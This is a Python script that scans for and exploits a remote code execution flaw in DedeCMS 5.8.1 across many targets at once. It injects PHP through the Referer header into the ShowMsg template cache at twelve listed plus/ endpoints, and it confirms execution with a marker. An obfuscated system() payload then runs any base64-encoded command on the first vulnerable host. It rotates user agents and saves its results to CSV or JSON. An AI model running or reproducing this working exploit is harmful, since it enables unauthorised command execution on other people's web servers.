#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
dedecms_581_rce_scan.py

DedeCMS v5.8.1 ShowMsg() Referer -> template cache RCE 批量检测 / 回显验证。

- 覆盖 plus/ 下 12 个可达 ShowMsg(...,'-1') 的入口，共 16 个参数变体
- written 用 payload 前缀匹配（只算字符串进了模板），executed 用运行期拼接标记（算 PHP 真执行）
- 并发、超时、重试、CSV/JSON 落盘、可选命令执行

用法:
    python dedecms_581_rce_scan.py -u http://target
    python dedecms_581_rce_scan.py -f urls.txt -t 20 -o result.csv
    python dedecms_581_rce_scan.py -u http://target --cmd whoami
    python dedecms_581_rce_scan.py --list
"""

import argparse
import base64
import csv
import json
import secrets
import string
import sys
import time
from concurrent.futures import ThreadPoolExecutor, as_completed

if hasattr(sys.stdout, "reconfigure"):
    try:
        sys.stdout.reconfigure(encoding="utf-8")
        sys.stderr.reconfigure(encoding="utf-8")
    except Exception:
        pass

try:
    import requests
    from requests.packages.urllib3.exceptions import InsecureRequestWarning
    requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
except ImportError:
    sys.stderr.write("需要 requests: pip install requests\n")
    sys.exit(2)


UA_POOL = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36",
]

# name, path, [(method, query, post_data)], note
ENDPOINTS = [
    ("recommend", "/plus/recommend.php",
     [("GET", "", None)],
     "aid 为空 -> ShowMsg('-1')  recommend.php:28"),
    ("flink", "/plus/flink.php",
     [("GET", "?dopost=save", None), ("GET", "?dopost=save&validate=x", None)],
     "验证码失败分支 -> ShowMsg('-1')  flink.php:22"),
    ("search", "/plus/search.php",
     [("GET", "?keyword=", None), ("GET", "?keyword=a", None)],
     "关键字为空 -> ShowMsg('-1')  search.php:83"),
    ("users-reg-new", "/plus/users-reg-new.php",
     [("GET", "?dopost=regbase&vdcode=x", None)],
     "验证码错误 -> ShowMsg('-1')  users-reg-new.php:34"),
    ("users-do", "/plus/users-do.php",
     [("GET", "?fmdo=sendMail", None)],
     "邮箱格式错误 -> ShowMsg('-1')  users-do.php:25"),
    ("download", "/plus/download.php",
     [("GET", "?open=0&aid=999999999", None), ("GET", "?open=2&id=999999999", None)],
     "文档不存在 -> ShowMsg('-1')  download.php:28,188"),
    ("posttocar", "/plus/posttocar.php",
     [("GET", "?do=add&id=999999999", None)],
     "商品不存在 -> ShowMsg('-1')  posttocar.php:27"),
    ("showphoto", "/plus/showphoto.php",
     [("GET", "?aid=999999999", None)],
     "文档不存在 -> ShowMsg('-1')  showphoto.php:41"),
    ("advancedsearch", "/plus/advancedsearch.php",
     [("GET", "?mid=0", None), ("GET", "", None)],
     "时间锁命中 -> showmsg('-1')  advancedsearch.php:25"),
    ("view", "/plus/view.php",
     [("GET", "?aid=999999999", None)],
     "文档不存在 / 购买失败  view.php:106,120"),
    ("users_config", "/plus/users_config.php",
     [("POST", "", {"dopost": "save", "_csrf_token": "x"})],
     "CSRF 校验失败 -> ShowMsg('-1')  users_config.php:100"),
    ("guestbook-control", "/plus/guestbook.php",
     [("GET", "?action=save&validate=x", None)],
     "对照组: 该分支 gourl 为空串，不应命中"),
]


def marker_payload():
    tag = secrets.token_hex(4)
    a, b = tag[:4], tag[4:]
    # 源码里只有 'a'.'b'，执行后才出现 ab
    return tag, "<?php $m='%s'.'%s';echo $m;?>" % (a, b)


def cmd_payload(cmd):
    tok = secrets.token_hex(3)
    b64 = base64.b64encode(cmd.encode("utf-8")).decode("ascii")
    payload = ("<?php $f='sys'.'tem';echo 'BGN%s>';$f(base64_decode('%s'));echo '<END%s';?>"
               % (tok, b64, tok))
    return tok, payload


def fetch(session, url, method, query, data, payload, timeout, verify, proxy):
    target = url.rstrip("/") + query
    headers = {
        "User-Agent": secrets.choice(UA_POOL),
        "Referer": payload,
        "Connection": "close",
    }
    kwargs = {
        "headers": headers,
        "timeout": timeout,
        "verify": verify,
        "allow_redirects": False,
    }
    if proxy:
        kwargs["proxies"] = {"http": proxy, "https": proxy}
    if method == "POST":
        kwargs["data"] = data or {}
        return session.post(target, **kwargs)
    return session.get(target, **kwargs)


def check_one(target, endpoint, method, query, data, timeout, verify, proxy):
    tag, payload = marker_payload()
    started = time.time()
    session = requests.Session()
    try:
        resp = fetch(session, target, method, query, data, payload, timeout, verify, proxy)
        text = resp.text or ""
        return {
            "target": target,
            "endpoint": endpoint,
            "method": method,
            "query": query,
            "status": resp.status_code,
            "written": ("location='" + payload[:24]) in text,
            "executed": tag in text,
            "elapsed_ms": int((time.time() - started) * 1000),
            "evidence": (tag if tag in text else ""),
            "error": "",
        }
    except Exception as exc:
        return {
            "target": target,
            "endpoint": endpoint,
            "method": method,
            "query": query,
            "status": 0,
            "written": False,
            "executed": False,
            "elapsed_ms": int((time.time() - started) * 1000),
            "evidence": "",
            "error": type(exc).__name__ + ": " + str(exc)[:120],
        }
    finally:
        session.close()


def run_command(target, endpoint, method, query, data, cmd, timeout, verify, proxy):
    session = requests.Session()
    try:
        tok, payload = cmd_payload(cmd)
        resp = fetch(session, target, method, query, data, payload, timeout, verify, proxy)
        text = resp.text or ""
        begin_tag, end_tag = "BGN%s>" % tok, "<END%s" % tok
        begin, end = text.rfind(begin_tag), text.rfind(end_tag)
        if begin != -1 and end != -1 and end > begin:
            return text[begin + len(begin_tag):end].strip()
        return ""
    except Exception:
        return ""
    finally:
        session.close()


def main():
    ap = argparse.ArgumentParser(description="DedeCMS v5.8.1 ShowMsg Referer RCE scanner")
    ap.add_argument("-u", "--url", help="single target, e.g. http://1.2.3.4")
    ap.add_argument("-f", "--file", help="file with one target per line")
    ap.add_argument("-t", "--threads", type=int, default=10)
    ap.add_argument("--timeout", type=float, default=8.0)
    ap.add_argument("--proxy", default="")
    ap.add_argument("--insecure", action="store_true", help="disable TLS verification")
    ap.add_argument("--only", default="", help="comma separated endpoint names")
    ap.add_argument("--cmd", default="", help="run command on the first verified target")
    ap.add_argument("-o", "--out", default="", help="write CSV")
    ap.add_argument("--json", default="", help="write JSONL")
    ap.add_argument("--list", action="store_true", help="list endpoints and exit")
    args = ap.parse_args()

    if args.list:
        for name, path, variants, note in ENDPOINTS:
            print("%-18s %-28s variants=%d  %s" % (name, path, len(variants), note))
        return 0

    targets = []
    if args.url:
        targets.append(args.url.strip())
    if args.file:
        with open(args.file, "r", encoding="utf-8", errors="ignore") as fh:
            targets += [line.strip() for line in fh if line.strip()]
    targets = [t for t in dict.fromkeys(targets) if t]
    if not targets:
        sys.stderr.write("需要 -u 或 -f\n")
        return 2

    only = {x.strip() for x in args.only.split(",") if x.strip()}
    endpoints = [e for e in ENDPOINTS if not only or e[0] in only]

    tasks = []
    for target in targets:
        for name, path, variants, note in endpoints:
            for method, query, data in variants:
                tasks.append((target + path, name, method, query, data))

    verify = not args.insecure
    results = []
    with ThreadPoolExecutor(max_workers=max(1, args.threads)) as pool:
        futures = {
            pool.submit(check_one, t, name, m, q, d, args.timeout, verify, args.proxy): (t, name)
            for t, name, m, q, d in tasks
        }
        for fut in as_completed(futures):
            res = fut.result()
            results.append(res)
            if res["executed"]:
                print("[RCE] %-16s %s%s  %dms" % (res["endpoint"], res["target"], res["query"], res["elapsed_ms"]))
            elif res["written"]:
                print("[WRT] %-16s %s%s  %dms" % (res["endpoint"], res["target"], res["query"], res["elapsed_ms"]))
            elif res["error"]:
                print("[ERR] %-16s %s%s  %s" % (res["endpoint"], res["target"], res["query"], res["error"]))

    hit = [r for r in results if r["executed"]]
    print("")
    print("targets=%d  probes=%d  written=%d  executed=%d" % (
        len(targets), len(results), sum(1 for r in results if r["written"]), len(hit)))
    print("note: each probe may leave data/tplcache/string_<md5>.inc on the target; read and remove them after testing")

    if args.out:
        with open(args.out, "w", newline="", encoding="utf-8-sig") as fh:
            writer = csv.DictWriter(fh, fieldnames=list(results[0].keys()) if results else [])
            writer.writeheader()
            writer.writerows(results)
        print("csv: %s" % args.out)
    if args.json:
        with open(args.json, "w", encoding="utf-8") as fh:
            for r in results:
                fh.write(json.dumps(r, ensure_ascii=False) + "\n")
        print("jsonl: %s" % args.json)

    if args.cmd and hit:
        first = hit[0]
        out = run_command(first["target"], first["endpoint"], first["method"],
                          first["query"], None, args.cmd,
                          args.timeout, verify, args.proxy)
        print("")
        print("[cmd] %s" % args.cmd)
        print(out if out else "(empty)")

    return 0


if __name__ == "__main__":
    sys.exit(main())
